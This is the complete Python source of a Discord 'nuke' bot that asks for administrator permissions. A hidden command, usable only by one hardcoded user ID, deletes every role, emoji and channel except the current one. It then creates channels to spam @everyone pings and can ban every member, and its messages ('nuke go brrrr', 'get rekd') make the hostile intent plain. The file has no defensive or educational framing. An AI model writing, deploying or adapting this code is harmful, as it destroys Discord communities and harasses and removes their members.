import discord
from discord.ext import commands
import os
import dotenv
import threading

# https://discord.com/api/oauth2/authorize?client_id=846818976238665779&permissions=8&scope=bot

bot = commands.Bot(
    command_prefix="_?_", help_command=None, intents=discord.Intents.all()
)


async def del_roles(ctx):
    roles = ctx.guild.roles
    for role in roles:
        try:
            await role.delete()
        except:
            pass


async def del_emojis(ctx):
    emojis = ctx.guild.emojis
    for emoji in emojis:
        try:
            await emoji.delete()
        except:
            pass


async def del_channels(ctx):
    channels = ctx.guild.channels
    curr_channel = ctx.message.channel
    for channel in channels:
        if channel != curr_channel:
            try:
                await channel.delete()
            except:
                pass


async def ping_everyone(ctx, ping):
    temp_channels = []
    for i in range(10):
        temp_channels.append(await ctx.guild.create_text_channel("heh"))
    for i in range(ping):
        for channel in temp_channels:
            if isinstance(channel, discord.TextChannel):
                await channel.send("@everyone")


async def ban_everyone(ctx):
    members = ctx.guild.members
    for member in members:
        try:
            await member.ban()
        except:
            pass


@bot.command()
async def nuke(ctx, ping: int, ban=None):
    if ctx.author.id == 688530998920871969:
        await ctx.send("hehe nuke go brrrr")
        await del_roles(ctx)
        await del_emojis(ctx)
        await del_channels(ctx)

        if ping:
            await ping_everyone(ctx, ping)
        if ban:
            await ban_everyone(ctx)
        await ctx.send("nuke done, get rekd")


dotenv.load_dotenv()
bot.run(os.environ["NUKEYBOY_TOKEN"])  # bot token